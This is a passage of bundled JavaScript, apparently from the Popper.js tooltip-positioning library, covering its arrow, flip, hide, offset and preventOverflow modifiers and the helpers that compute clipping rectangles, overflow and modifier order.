  var clientSize = arrowOffsetParent ? axis === "y" ? arrowOffsetParent.clientHeight || 0 : arrowOffsetParent.clientWidth || 0 : 0;
  var centerToReference = endDiff / 2 - startDiff / 2;
  var min2 = paddingObject[minProp];
  var max2 = clientSize - arrowRect[len] - paddingObject[maxProp];
  var center = clientSize / 2 - arrowRect[len] / 2 + centerToReference;
  var offset2 = within(min2, center, max2);
  var axisProp = axis;
  state.modifiersData[name] = (_state$modifiersData$ = {}, _state$modifiersData$[axisProp] = offset2, _state$modifiersData$.centerOffset = offset2 - center, _state$modifiersData$);
}
function effect$1(_ref2) {
  var state = _ref2.state, options = _ref2.options;
  var _options$element = options.element, arrowElement = _options$element === void 0 ? "[data-popper-arrow]" : _options$element;
  if (arrowElement == null) {
    return;
  }
  if (typeof arrowElement === "string") {
    arrowElement = state.elements.popper.querySelector(arrowElement);
    if (!arrowElement) {
      return;
    }
  }
  if (!contains(state.elements.popper, arrowElement)) {
    return;
  }
  state.elements.arrow = arrowElement;
}
const arrow$1 = {
  name: "arrow",
  enabled: true,
  phase: "main",
  fn: arrow,
  effect: effect$1,
  requires: ["popperOffsets"],
  requiresIfExists: ["preventOverflow"]
};
function getVariation(placement) {
  return placement.split("-")[1];
}
var unsetSides = {
  top: "auto",
  right: "auto",
  bottom: "auto",
  left: "auto"
};
function roundOffsetsByDPR(_ref, win) {
  var x = _ref.x, y3 = _ref.y;
  var dpr = win.devicePixelRatio || 1;
  return {
    x: round(x * dpr) / dpr || 0,
    y: round(y3 * dpr) / dpr || 0
  };
}
function mapToStyles(_ref2) {
  var _Object$assign2;
  var popper2 = _ref2.popper, popperRect = _ref2.popperRect, placement = _ref2.placement, variation = _ref2.variation, offsets = _ref2.offsets, position = _ref2.position, gpuAcceleration = _ref2.gpuAcceleration, adaptive = _ref2.adaptive, roundOffsets = _ref2.roundOffsets, isFixed = _ref2.isFixed;
  var _offsets$x = offsets.x, x = _offsets$x === void 0 ? 0 : _offsets$x, _offsets$y = offsets.y, y3 = _offsets$y === void 0 ? 0 : _offsets$y;
  var _ref3 = typeof roundOffsets === "function" ? roundOffsets({
    x,
    y: y3
  }) : {
    x,
    y: y3
  };
  x = _ref3.x;
  y3 = _ref3.y;
  var hasX = offsets.hasOwnProperty("x");
  var hasY = offsets.hasOwnProperty("y");
  var sideX = left;
  var sideY = top;
  var win = window;
  if (adaptive) {
    var offsetParent = getOffsetParent(popper2);
    var heightProp = "clientHeight";
    var widthProp = "clientWidth";
    if (offsetParent === getWindow(popper2)) {
      offsetParent = getDocumentElement(popper2);
      if (getComputedStyle(offsetParent).position !== "static" && position === "absolute") {
        heightProp = "scrollHeight";
        widthProp = "scrollWidth";
      }
    }
    offsetParent = offsetParent;
    if (placement === top || (placement === left || placement === right) && variation === end) {
      sideY = bottom;
      var offsetY = isFixed && offsetParent === win && win.visualViewport ? win.visualViewport.height : (
        // $FlowFixMe[prop-missing]
        offsetParent[heightProp]
      );
      y3 -= offsetY - popperRect.height;
      y3 *= gpuAcceleration ? 1 : -1;
    }
    if (placement === left || (placement === top || placement === bottom) && variation === end) {
      sideX = right;
      var offsetX = isFixed && offsetParent === win && win.visualViewport ? win.visualViewport.width : (
        // $FlowFixMe[prop-missing]
        offsetParent[widthProp]
      );
      x -= offsetX - popperRect.width;
      x *= gpuAcceleration ? 1 : -1;
    }
  }
  var commonStyles = Object.assign({
    position
  }, adaptive && unsetSides);
  var _ref4 = roundOffsets === true ? roundOffsetsByDPR({
    x,
    y: y3
  }, getWindow(popper2)) : {
    x,
    y: y3
  };
  x = _ref4.x;
  y3 = _ref4.y;
  if (gpuAcceleration) {
    var _Object$assign;
    return Object.assign({}, commonStyles, (_Object$assign = {}, _Object$assign[sideY] = hasY ? "0" : "", _Object$assign[sideX] = hasX ? "0" : "", _Object$assign.transform = (win.devicePixelRatio || 1) <= 1 ? "translate(" + x + "px, " + y3 + "px)" : "translate3d(" + x + "px, " + y3 + "px, 0)", _Object$assign));
  }
  return Object.assign({}, commonStyles, (_Object$assign2 = {}, _Object$assign2[sideY] = hasY ? y3 + "px" : "", _Object$assign2[sideX] = hasX ? x + "px" : "", _Object$assign2.transform = "", _Object$assign2));
}
function computeStyles(_ref5) {
  var state = _ref5.state, options = _ref5.options;
  var _options$gpuAccelerat = options.gpuAcceleration, gpuAcceleration = _options$gpuAccelerat === void 0 ? true : _options$gpuAccelerat, _options$adaptive = options.adaptive, adaptive = _options$adaptive === void 0 ? true : _options$adaptive, _options$roundOffsets = options.roundOffsets, roundOffsets = _options$roundOffsets === void 0 ? true : _options$roundOffsets;
  var commonStyles = {
    placement: getBasePlacement(state.placement),
    variation: getVariation(state.placement),
    popper: state.elements.popper,
    popperRect: state.rects.popper,
    gpuAcceleration,
    isFixed: state.options.strategy === "fixed"
  };
  if (state.modifiersData.popperOffsets != null) {
    state.styles.popper = Object.assign({}, state.styles.popper, mapToStyles(Object.assign({}, commonStyles, {
      offsets: state.modifiersData.popperOffsets,
      position: state.options.strategy,
      adaptive,
      roundOffsets
    })));
  }
  if (state.modifiersData.arrow != null) {
    state.styles.arrow = Object.assign({}, state.styles.arrow, mapToStyles(Object.assign({}, commonStyles, {
      offsets: state.modifiersData.arrow,
      position: "absolute",
      adaptive: false,
      roundOffsets
    })));
  }
  state.attributes.popper = Object.assign({}, state.attributes.popper, {
    "data-popper-placement": state.placement
  });
}
const computeStyles$1 = {
  name: "computeStyles",
  enabled: true,
  phase: "beforeWrite",
  fn: computeStyles,
  data: {}
};
var passive = {
  passive: true
};
function effect(_ref) {
  var state = _ref.state, instance = _ref.instance, options = _ref.options;
  var _options$scroll = options.scroll, scroll = _options$scroll === void 0 ? true : _options$scroll, _options$resize = options.resize, resize = _options$resize === void 0 ? true : _options$resize;
  var window2 = getWindow(state.elements.popper);
  var scrollParents = [].concat(state.scrollParents.reference, state.scrollParents.popper);
  if (scroll) {
    scrollParents.forEach(function(scrollParent) {
      scrollParent.addEventListener("scroll", instance.update, passive);
    });
  }
  if (resize) {
    window2.addEventListener("resize", instance.update, passive);
  }
  return function() {
    if (scroll) {
      scrollParents.forEach(function(scrollParent) {
        scrollParent.removeEventListener("scroll", instance.update, passive);
      });
    }
    if (resize) {
      window2.removeEventListener("resize", instance.update, passive);
    }
  };
}
const eventListeners = {
  name: "eventListeners",
  enabled: true,
  phase: "write",
  fn: function fn() {
  },
  effect,
  data: {}
};
var hash$1 = {
  left: "right",
  right: "left",
  bottom: "top",
  top: "bottom"
};
function getOppositePlacement(placement) {
  return placement.replace(/left|right|bottom|top/g, function(matched) {
    return hash$1[matched];
  });
}
var hash = {
  start: "end",
  end: "start"
};
function getOppositeVariationPlacement(placement) {
  return placement.replace(/start|end/g, function(matched) {
    return hash[matched];
  });
}
function getWindowScroll(node) {
  var win = getWindow(node);
  var scrollLeft = win.pageXOffset;
  var scrollTop = win.pageYOffset;
  return {
    scrollLeft,
    scrollTop
  };
}
function getWindowScrollBarX(element) {
  return getBoundingClientRect(getDocumentElement(element)).left + getWindowScroll(element).scrollLeft;
}
function getViewportRect(element, strategy) {
  var win = getWindow(element);
  var html2 = getDocumentElement(element);
  var visualViewport = win.visualViewport;
  var width = html2.clientWidth;
  var height = html2.clientHeight;
  var x = 0;
  var y3 = 0;
  if (visualViewport) {
    width = visualViewport.width;
    height = visualViewport.height;
    var layoutViewport = isLayoutViewport();
    if (layoutViewport || !layoutViewport && strategy === "fixed") {
      x = visualViewport.offsetLeft;
      y3 = visualViewport.offsetTop;
    }
  }
  return {
    width,
    height,
    x: x + getWindowScrollBarX(element),
    y: y3
  };
}
function getDocumentRect(element) {
  var _element$ownerDocumen;
  var html2 = getDocumentElement(element);
  var winScroll = getWindowScroll(element);
  var body = (_element$ownerDocumen = element.ownerDocument) == null ? void 0 : _element$ownerDocumen.body;
  var width = max(html2.scrollWidth, html2.clientWidth, body ? body.scrollWidth : 0, body ? body.clientWidth : 0);
  var height = max(html2.scrollHeight, html2.clientHeight, body ? body.scrollHeight : 0, body ? body.clientHeight : 0);
  var x = -winScroll.scrollLeft + getWindowScrollBarX(element);
  var y3 = -winScroll.scrollTop;
  if (getComputedStyle(body || html2).direction === "rtl") {
    x += max(html2.clientWidth, body ? body.clientWidth : 0) - width;
  }
  return {
    width,
    height,
    x,
    y: y3
  };
}
function isScrollParent(element) {
  var _getComputedStyle = getComputedStyle(element), overflow = _getComputedStyle.overflow, overflowX = _getComputedStyle.overflowX, overflowY = _getComputedStyle.overflowY;
  return /auto|scroll|overlay|hidden/.test(overflow + overflowY + overflowX);
}
function getScrollParent(node) {
  if (["html", "body", "#document"].indexOf(getNodeName(node)) >= 0) {
    return node.ownerDocument.body;
  }
  if (isHTMLElement(node) && isScrollParent(node)) {
    return node;
  }
  return getScrollParent(getParentNode(node));
}
function listScrollParents(element, list2) {
  var _element$ownerDocumen;
  if (list2 === void 0) {
    list2 = [];
  }
  var scrollParent = getScrollParent(element);
  var isBody = scrollParent === ((_element$ownerDocumen = element.ownerDocument) == null ? void 0 : _element$ownerDocumen.body);
  var win = getWindow(scrollParent);
  var target = isBody ? [win].concat(win.visualViewport || [], isScrollParent(scrollParent) ? scrollParent : []) : scrollParent;
  var updatedList = list2.concat(target);
  return isBody ? updatedList : (
    // $FlowFixMe[incompatible-call]: isBody tells us target will be an HTMLElement here
    updatedList.concat(listScrollParents(getParentNode(target)))
  );
}
function rectToClientRect(rect) {
  return Object.assign({}, rect, {
    left: rect.x,
    top: rect.y,
    right: rect.x + rect.width,
    bottom: rect.y + rect.height
  });
}
function getInnerBoundingClientRect(element, strategy) {
  var rect = getBoundingClientRect(element, false, strategy === "fixed");
  rect.top = rect.top + element.clientTop;
  rect.left = rect.left + element.clientLeft;
  rect.bottom = rect.top + element.clientHeight;
  rect.right = rect.left + element.clientWidth;
  rect.width = element.clientWidth;
  rect.height = element.clientHeight;
  rect.x = rect.left;
  rect.y = rect.top;
  return rect;
}
function getClientRectFromMixedType(element, clippingParent, strategy) {
  return clippingParent === viewport ? rectToClientRect(getViewportRect(element, strategy)) : isElement$1(clippingParent) ? getInnerBoundingClientRect(clippingParent, strategy) : rectToClientRect(getDocumentRect(getDocumentElement(element)));
}
function getClippingParents(element) {
  var clippingParents2 = listScrollParents(getParentNode(element));
  var canEscapeClipping = ["absolute", "fixed"].indexOf(getComputedStyle(element).position) >= 0;
  var clipperElement = canEscapeClipping && isHTMLElement(element) ? getOffsetParent(element) : element;
  if (!isElement$1(clipperElement)) {
    return [];
  }
  return clippingParents2.filter(function(clippingParent) {
    return isElement$1(clippingParent) && contains(clippingParent, clipperElement) && getNodeName(clippingParent) !== "body";
  });
}
function getClippingRect(element, boundary, rootBoundary, strategy) {
  var mainClippingParents = boundary === "clippingParents" ? getClippingParents(element) : [].concat(boundary);
  var clippingParents2 = [].concat(mainClippingParents, [rootBoundary]);
  var firstClippingParent = clippingParents2[0];
  var clippingRect = clippingParents2.reduce(function(accRect, clippingParent) {
    var rect = getClientRectFromMixedType(element, clippingParent, strategy);
    accRect.top = max(rect.top, accRect.top);
    accRect.right = min(rect.right, accRect.right);
    accRect.bottom = min(rect.bottom, accRect.bottom);
    accRect.left = max(rect.left, accRect.left);
    return accRect;
  }, getClientRectFromMixedType(element, firstClippingParent, strategy));
  clippingRect.width = clippingRect.right - clippingRect.left;
  clippingRect.height = clippingRect.bottom - clippingRect.top;
  clippingRect.x = clippingRect.left;
  clippingRect.y = clippingRect.top;
  return clippingRect;
}
function computeOffsets(_ref) {
  var reference2 = _ref.reference, element = _ref.element, placement = _ref.placement;
  var basePlacement = placement ? getBasePlacement(placement) : null;
  var variation = placement ? getVariation(placement) : null;
  var commonX = reference2.x + reference2.width / 2 - element.width / 2;
  var commonY = reference2.y + reference2.height / 2 - element.height / 2;
  var offsets;
  switch (basePlacement) {
    case top:
      offsets = {
        x: commonX,
        y: reference2.y - element.height
      };
      break;
    case bottom:
      offsets = {
        x: commonX,
        y: reference2.y + reference2.height
      };
      break;
    case right:
      offsets = {
        x: reference2.x + reference2.width,
        y: commonY
      };
      break;
    case left:
      offsets = {
        x: reference2.x - element.width,
        y: commonY
      };
      break;
    default:
      offsets = {
        x: reference2.x,
        y: reference2.y
      };
  }
  var mainAxis = basePlacement ? getMainAxisFromPlacement(basePlacement) : null;
  if (mainAxis != null) {
    var len = mainAxis === "y" ? "height" : "width";
    switch (variation) {
      case start:
        offsets[mainAxis] = offsets[mainAxis] - (reference2[len] / 2 - element[len] / 2);
        break;
      case end:
        offsets[mainAxis] = offsets[mainAxis] + (reference2[len] / 2 - element[len] / 2);
        break;
    }
  }
  return offsets;
}
function detectOverflow(state, options) {
  if (options === void 0) {
    options = {};
  }
  var _options = options, _options$placement = _options.placement, placement = _options$placement === void 0 ? state.placement : _options$placement, _options$strategy = _options.strategy, strategy = _options$strategy === void 0 ? state.strategy : _options$strategy, _options$boundary = _options.boundary, boundary = _options$boundary === void 0 ? clippingParents : _options$boundary, _options$rootBoundary = _options.rootBoundary, rootBoundary = _options$rootBoundary === void 0 ? viewport : _options$rootBoundary, _options$elementConte = _options.elementContext, elementContext = _options$elementConte === void 0 ? popper : _options$elementConte, _options$altBoundary = _options.altBoundary, altBoundary = _options$altBoundary === void 0 ? false : _options$altBoundary, _options$padding = _options.padding, padding = _options$padding === void 0 ? 0 : _options$padding;
  var paddingObject = mergePaddingObject(typeof padding !== "number" ? padding : expandToHashMap(padding, basePlacements));
  var altContext = elementContext === popper ? reference : popper;
  var popperRect = state.rects.popper;
  var element = state.elements[altBoundary ? altContext : elementContext];
  var clippingClientRect = getClippingRect(isElement$1(element) ? element : element.contextElement || getDocumentElement(state.elements.popper), boundary, rootBoundary, strategy);
  var referenceClientRect = getBoundingClientRect(state.elements.reference);
  var popperOffsets2 = computeOffsets({
    reference: referenceClientRect,
    element: popperRect,
    strategy: "absolute",
    placement
  });
  var popperClientRect = rectToClientRect(Object.assign({}, popperRect, popperOffsets2));
  var elementClientRect = elementContext === popper ? popperClientRect : referenceClientRect;
  var overflowOffsets = {
    top: clippingClientRect.top - elementClientRect.top + paddingObject.top,
    bottom: elementClientRect.bottom - clippingClientRect.bottom + paddingObject.bottom,
    left: clippingClientRect.left - elementClientRect.left + paddingObject.left,
    right: elementClientRect.right - clippingClientRect.right + paddingObject.right
  };
  var offsetData = state.modifiersData.offset;
  if (elementContext === popper && offsetData) {
    var offset2 = offsetData[placement];
    Object.keys(overflowOffsets).forEach(function(key) {
      var multiply = [right, bottom].indexOf(key) >= 0 ? 1 : -1;
      var axis = [top, bottom].indexOf(key) >= 0 ? "y" : "x";
      overflowOffsets[key] += offset2[axis] * multiply;
    });
  }
  return overflowOffsets;
}
function computeAutoPlacement(state, options) {
  if (options === void 0) {
    options = {};
  }
  var _options = options, placement = _options.placement, boundary = _options.boundary, rootBoundary = _options.rootBoundary, padding = _options.padding, flipVariations = _options.flipVariations, _options$allowedAutoP = _options.allowedAutoPlacements, allowedAutoPlacements = _options$allowedAutoP === void 0 ? placements : _options$allowedAutoP;
  var variation = getVariation(placement);
  var placements$1 = variation ? flipVariations ? variationPlacements : variationPlacements.filter(function(placement2) {
    return getVariation(placement2) === variation;
  }) : basePlacements;
  var allowedPlacements = placements$1.filter(function(placement2) {
    return allowedAutoPlacements.indexOf(placement2) >= 0;
  });
  if (allowedPlacements.length === 0) {
    allowedPlacements = placements$1;
  }
  var overflows = allowedPlacements.reduce(function(acc, placement2) {
    acc[placement2] = detectOverflow(state, {
      placement: placement2,
      boundary,
      rootBoundary,
      padding
    })[getBasePlacement(placement2)];
    return acc;
  }, {});
  return Object.keys(overflows).sort(function(a, b) {
    return overflows[a] - overflows[b];
  });
}
function getExpandedFallbackPlacements(placement) {
  if (getBasePlacement(placement) === auto) {
    return [];
  }
  var oppositePlacement = getOppositePlacement(placement);
  return [getOppositeVariationPlacement(placement), oppositePlacement, getOppositeVariationPlacement(oppositePlacement)];
}
function flip(_ref) {
  var state = _ref.state, options = _ref.options, name = _ref.name;
  if (state.modifiersData[name]._skip) {
    return;
  }
  var _options$mainAxis = options.mainAxis, checkMainAxis = _options$mainAxis === void 0 ? true : _options$mainAxis, _options$altAxis = options.altAxis, checkAltAxis = _options$altAxis === void 0 ? true : _options$altAxis, specifiedFallbackPlacements = options.fallbackPlacements, padding = options.padding, boundary = options.boundary, rootBoundary = options.rootBoundary, altBoundary = options.altBoundary, _options$flipVariatio = options.flipVariations, flipVariations = _options$flipVariatio === void 0 ? true : _options$flipVariatio, allowedAutoPlacements = options.allowedAutoPlacements;
  var preferredPlacement = state.options.placement;
  var basePlacement = getBasePlacement(preferredPlacement);
  var isBasePlacement = basePlacement === preferredPlacement;
  var fallbackPlacements = specifiedFallbackPlacements || (isBasePlacement || !flipVariations ? [getOppositePlacement(preferredPlacement)] : getExpandedFallbackPlacements(preferredPlacement));
  var placements2 = [preferredPlacement].concat(fallbackPlacements).reduce(function(acc, placement2) {
    return acc.concat(getBasePlacement(placement2) === auto ? computeAutoPlacement(state, {
      placement: placement2,
      boundary,
      rootBoundary,
      padding,
      flipVariations,
      allowedAutoPlacements
    }) : placement2);
  }, []);
  var referenceRect = state.rects.reference;
  var popperRect = state.rects.popper;
  var checksMap = /* @__PURE__ */ new Map();
  var makeFallbackChecks = true;
  var firstFittingPlacement = placements2[0];
  for (var i2 = 0; i2 < placements2.length; i2++) {
    var placement = placements2[i2];
    var _basePlacement = getBasePlacement(placement);
    var isStartVariation = getVariation(placement) === start;
    var isVertical = [top, bottom].indexOf(_basePlacement) >= 0;
    var len = isVertical ? "width" : "height";
    var overflow = detectOverflow(state, {
      placement,
      boundary,
      rootBoundary,
      altBoundary,
      padding
    });
    var mainVariationSide = isVertical ? isStartVariation ? right : left : isStartVariation ? bottom : top;
    if (referenceRect[len] > popperRect[len]) {
      mainVariationSide = getOppositePlacement(mainVariationSide);
    }
    var altVariationSide = getOppositePlacement(mainVariationSide);
    var checks = [];
    if (checkMainAxis) {
      checks.push(overflow[_basePlacement] <= 0);
    }
    if (checkAltAxis) {
      checks.push(overflow[mainVariationSide] <= 0, overflow[altVariationSide] <= 0);
    }
    if (checks.every(function(check) {
      return check;
    })) {
      firstFittingPlacement = placement;
      makeFallbackChecks = false;
      break;
    }
    checksMap.set(placement, checks);
  }
  if (makeFallbackChecks) {
    var numberOfChecks = flipVariations ? 3 : 1;
    var _loop = function _loop2(_i2) {
      var fittingPlacement = placements2.find(function(placement2) {
        var checks2 = checksMap.get(placement2);
        if (checks2) {
          return checks2.slice(0, _i2).every(function(check) {
            return check;
          });
        }
      });
      if (fittingPlacement) {
        firstFittingPlacement = fittingPlacement;
        return "break";
      }
    };
    for (var _i = numberOfChecks; _i > 0; _i--) {
      var _ret = _loop(_i);
      if (_ret === "break") break;
    }
  }
  if (state.placement !== firstFittingPlacement) {
    state.modifiersData[name]._skip = true;
    state.placement = firstFittingPlacement;
    state.reset = true;
  }
}
const flip$1 = {
  name: "flip",
  enabled: true,
  phase: "main",
  fn: flip,
  requiresIfExists: ["offset"],
  data: {
    _skip: false
  }
};
function getSideOffsets(overflow, rect, preventedOffsets) {
  if (preventedOffsets === void 0) {
    preventedOffsets = {
      x: 0,
      y: 0
    };
  }
  return {
    top: overflow.top - rect.height - preventedOffsets.y,
    right: overflow.right - rect.width + preventedOffsets.x,
    bottom: overflow.bottom - rect.height + preventedOffsets.y,
    left: overflow.left - rect.width - preventedOffsets.x
  };
}
function isAnySideFullyClipped(overflow) {
  return [top, right, bottom, left].some(function(side) {
    return overflow[side] >= 0;
  });
}
function hide$1(_ref) {
  var state = _ref.state, name = _ref.name;
  var referenceRect = state.rects.reference;
  var popperRect = state.rects.popper;
  var preventedOffsets = state.modifiersData.preventOverflow;
  var referenceOverflow = detectOverflow(state, {
    elementContext: "reference"
  });
  var popperAltOverflow = detectOverflow(state, {
    altBoundary: true
  });
  var referenceClippingOffsets = getSideOffsets(referenceOverflow, referenceRect);
  var popperEscapeOffsets = getSideOffsets(popperAltOverflow, popperRect, preventedOffsets);
  var isReferenceHidden = isAnySideFullyClipped(referenceClippingOffsets);
  var hasPopperEscaped = isAnySideFullyClipped(popperEscapeOffsets);
  state.modifiersData[name] = {
    referenceClippingOffsets,
    popperEscapeOffsets,
    isReferenceHidden,
    hasPopperEscaped
  };
  state.attributes.popper = Object.assign({}, state.attributes.popper, {
    "data-popper-reference-hidden": isReferenceHidden,
    "data-popper-escaped": hasPopperEscaped
  });
}
const hide$2 = {
  name: "hide",
  enabled: true,
  phase: "main",
  requiresIfExists: ["preventOverflow"],
  fn: hide$1
};
function distanceAndSkiddingToXY(placement, rects, offset2) {
  var basePlacement = getBasePlacement(placement);
  var invertDistance = [left, top].indexOf(basePlacement) >= 0 ? -1 : 1;
  var _ref = typeof offset2 === "function" ? offset2(Object.assign({}, rects, {
    placement
  })) : offset2, skidding = _ref[0], distance = _ref[1];
  skidding = skidding || 0;
  distance = (distance || 0) * invertDistance;
  return [left, right].indexOf(basePlacement) >= 0 ? {
    x: distance,
    y: skidding
  } : {
    x: skidding,
    y: distance
  };
}
function offset$1(_ref2) {
  var state = _ref2.state, options = _ref2.options, name = _ref2.name;
  var _options$offset = options.offset, offset2 = _options$offset === void 0 ? [0, 0] : _options$offset;
  var data = placements.reduce(function(acc, placement) {
    acc[placement] = distanceAndSkiddingToXY(placement, state.rects, offset2);
    return acc;
  }, {});
  var _data$state$placement = data[state.placement], x = _data$state$placement.x, y3 = _data$state$placement.y;
  if (state.modifiersData.popperOffsets != null) {
    state.modifiersData.popperOffsets.x += x;
    state.modifiersData.popperOffsets.y += y3;
  }
  state.modifiersData[name] = data;
}
const offset$2 = {
  name: "offset",
  enabled: true,
  phase: "main",
  requires: ["popperOffsets"],
  fn: offset$1
};
function popperOffsets(_ref) {
  var state = _ref.state, name = _ref.name;
  state.modifiersData[name] = computeOffsets({
    reference: state.rects.reference,
    element: state.rects.popper,
    strategy: "absolute",
    placement: state.placement
  });
}
const popperOffsets$1 = {
  name: "popperOffsets",
  enabled: true,
  phase: "read",
  fn: popperOffsets,
  data: {}
};
function getAltAxis(axis) {
  return axis === "x" ? "y" : "x";
}
function preventOverflow(_ref) {
  var state = _ref.state, options = _ref.options, name = _ref.name;
  var _options$mainAxis = options.mainAxis, checkMainAxis = _options$mainAxis === void 0 ? true : _options$mainAxis, _options$altAxis = options.altAxis, checkAltAxis = _options$altAxis === void 0 ? false : _options$altAxis, boundary = options.boundary, rootBoundary = options.rootBoundary, altBoundary = options.altBoundary, padding = options.padding, _options$tether = options.tether, tether = _options$tether === void 0 ? true : _options$tether, _options$tetherOffset = options.tetherOffset, tetherOffset = _options$tetherOffset === void 0 ? 0 : _options$tetherOffset;
  var overflow = detectOverflow(state, {
    boundary,
    rootBoundary,
    padding,
    altBoundary
  });
  var basePlacement = getBasePlacement(state.placement);
  var variation = getVariation(state.placement);
  var isBasePlacement = !variation;
  var mainAxis = getMainAxisFromPlacement(basePlacement);
  var altAxis = getAltAxis(mainAxis);
  var popperOffsets2 = state.modifiersData.popperOffsets;
  var referenceRect = state.rects.reference;
  var popperRect = state.rects.popper;
  var tetherOffsetValue = typeof tetherOffset === "function" ? tetherOffset(Object.assign({}, state.rects, {
    placement: state.placement
  })) : tetherOffset;
  var normalizedTetherOffsetValue = typeof tetherOffsetValue === "number" ? {
    mainAxis: tetherOffsetValue,
    altAxis: tetherOffsetValue
  } : Object.assign({
    mainAxis: 0,
    altAxis: 0
  }, tetherOffsetValue);
  var offsetModifierState = state.modifiersData.offset ? state.modifiersData.offset[state.placement] : null;
  var data = {
    x: 0,
    y: 0
  };
  if (!popperOffsets2) {
    return;
  }
  if (checkMainAxis) {
    var _offsetModifierState$;
    var mainSide = mainAxis === "y" ? top : left;
    var altSide = mainAxis === "y" ? bottom : right;
    var len = mainAxis === "y" ? "height" : "width";
    var offset2 = popperOffsets2[mainAxis];
    var min$1 = offset2 + overflow[mainSide];
    var max$1 = offset2 - overflow[altSide];
    var additive = tether ? -popperRect[len] / 2 : 0;
    var minLen = variation === start ? referenceRect[len] : popperRect[len];
    var maxLen = variation === start ? -popperRect[len] : -referenceRect[len];
    var arrowElement = state.elements.arrow;
    var arrowRect = tether && arrowElement ? getLayoutRect(arrowElement) : {
      width: 0,
      height: 0
    };
    var arrowPaddingObject = state.modifiersData["arrow#persistent"] ? state.modifiersData["arrow#persistent"].padding : getFreshSideObject();
    var arrowPaddingMin = arrowPaddingObject[mainSide];
    var arrowPaddingMax = arrowPaddingObject[altSide];
    var arrowLen = within(0, referenceRect[len], arrowRect[len]);
    var minOffset = isBasePlacement ? referenceRect[len] / 2 - additive - arrowLen - arrowPaddingMin - normalizedTetherOffsetValue.mainAxis : minLen - arrowLen - arrowPaddingMin - normalizedTetherOffsetValue.mainAxis;
    var maxOffset = isBasePlacement ? -referenceRect[len] / 2 + additive + arrowLen + arrowPaddingMax + normalizedTetherOffsetValue.mainAxis : maxLen + arrowLen + arrowPaddingMax + normalizedTetherOffsetValue.mainAxis;
    var arrowOffsetParent = state.elements.arrow && getOffsetParent(state.elements.arrow);
    var clientOffset = arrowOffsetParent ? mainAxis === "y" ? arrowOffsetParent.clientTop || 0 : arrowOffsetParent.clientLeft || 0 : 0;
    var offsetModifierValue = (_offsetModifierState$ = offsetModifierState == null ? void 0 : offsetModifierState[mainAxis]) != null ? _offsetModifierState$ : 0;
    var tetherMin = offset2 + minOffset - offsetModifierValue - clientOffset;
    var tetherMax = offset2 + maxOffset - offsetModifierValue;
    var preventedOffset = within(tether ? min(min$1, tetherMin) : min$1, offset2, tether ? max(max$1, tetherMax) : max$1);
    popperOffsets2[mainAxis] = preventedOffset;
    data[mainAxis] = preventedOffset - offset2;
  }
  if (checkAltAxis) {
    var _offsetModifierState$2;
    var _mainSide = mainAxis === "x" ? top : left;
    var _altSide = mainAxis === "x" ? bottom : right;
    var _offset = popperOffsets2[altAxis];
    var _len = altAxis === "y" ? "height" : "width";
    var _min = _offset + overflow[_mainSide];
    var _max = _offset - overflow[_altSide];
    var isOriginSide = [top, left].indexOf(basePlacement) !== -1;
    var _offsetModifierValue = (_offsetModifierState$2 = offsetModifierState == null ? void 0 : offsetModifierState[altAxis]) != null ? _offsetModifierState$2 : 0;
    var _tetherMin = isOriginSide ? _min : _offset - referenceRect[_len] - popperRect[_len] - _offsetModifierValue + normalizedTetherOffsetValue.altAxis;
    var _tetherMax = isOriginSide ? _offset + referenceRect[_len] + popperRect[_len] - _offsetModifierValue - normalizedTetherOffsetValue.altAxis : _max;
    var _preventedOffset = tether && isOriginSide ? withinMaxClamp(_tetherMin, _offset, _tetherMax) : within(tether ? _tetherMin : _min, _offset, tether ? _tetherMax : _max);
    popperOffsets2[altAxis] = _preventedOffset;
    data[altAxis] = _preventedOffset - _offset;
  }
  state.modifiersData[name] = data;
}
const preventOverflow$1 = {
  name: "preventOverflow",
  enabled: true,
  phase: "main",
  fn: preventOverflow,
  requiresIfExists: ["offset"]
};
function getHTMLElementScroll(element) {
  return {
    scrollLeft: element.scrollLeft,
    scrollTop: element.scrollTop
  };
}
function getNodeScroll(node) {
  if (node === getWindow(node) || !isHTMLElement(node)) {
    return getWindowScroll(node);
  } else {
    return getHTMLElementScroll(node);
  }
}
function isElementScaled(element) {
  var rect = element.getBoundingClientRect();
  var scaleX = round(rect.width) / element.offsetWidth || 1;
  var scaleY = round(rect.height) / element.offsetHeight || 1;
  return scaleX !== 1 || scaleY !== 1;
}
function getCompositeRect(elementOrVirtualElement, offsetParent, isFixed) {
  if (isFixed === void 0) {
    isFixed = false;
  }
  var isOffsetParentAnElement = isHTMLElement(offsetParent);
  var offsetParentIsScaled = isHTMLElement(offsetParent) && isElementScaled(offsetParent);
  var documentElement = getDocumentElement(offsetParent);
  var rect = getBoundingClientRect(elementOrVirtualElement, offsetParentIsScaled, isFixed);
  var scroll = {
    scrollLeft: 0,
    scrollTop: 0
  };
  var offsets = {
    x: 0,
    y: 0
  };
  if (isOffsetParentAnElement || !isOffsetParentAnElement && !isFixed) {
    if (getNodeName(offsetParent) !== "body" || // https://github.com/popperjs/popper-core/issues/1078
    isScrollParent(documentElement)) {
      scroll = getNodeScroll(offsetParent);
    }
    if (isHTMLElement(offsetParent)) {
      offsets = getBoundingClientRect(offsetParent, true);
      offsets.x += offsetParent.clientLeft;
      offsets.y += offsetParent.clientTop;
    } else if (documentElement) {
      offsets.x = getWindowScrollBarX(documentElement);
    }
  }
  return {
    x: rect.left + scroll.scrollLeft - offsets.x,
    y: rect.top + scroll.scrollTop - offsets.y,
    width: rect.width,
    height: rect.height
  };
}
function order(modifiers) {
  var map = /* @__PURE__ */ new Map();
  var visited = /* @__PURE__ */ new Set();
  var result = [];
  modifiers.forEach(function(modifier) {
    map.set(modifier.name, modifier);
  });
  function sort(modifier) {
    visited.add(modifier.name);
    var requires = [].concat(modifier.requires || [], modifier.requiresIfExists || []);
    requires.forEach(function(dep) {
      if (!visited.has(dep)) {
        var depModifier = map.get(dep);
        if (depModifier) {
          sort(depModifier);
        }
      }
    });
    result.push(modifier);
  }
  modifiers.forEach(function(modifier) {
    if (!visited.has(modifier.name)) {
      sort(modifier);
    }
  });
  return result;
}
function orderModifiers(modifiers) {
  var orderedModifiers = order(modifiers);
  return modifierPhases.reduce(function(acc, phase) {
    return acc.concat(orderedModifiers.filter(function(modifier) {
      return modifier.phase === phase;
    }));
  }, []);
}
function debounce(fn2) {
  var pending;
  return function() {
    if (!pending) {
      pending = new Promise(function(resolve) {
        Promise.resolve().then(function() {
          pending = void 0;
          resolve(fn2());
        });
      });
    }
    return pending;
  };
}
function mergeByName(modifiers) {
  var merged = modifiers.reduce(function(merged2, current) {
    var existing = merged2[current.name];
    merged2[current.name] = existing ? Object.assign({}, existing, current, {
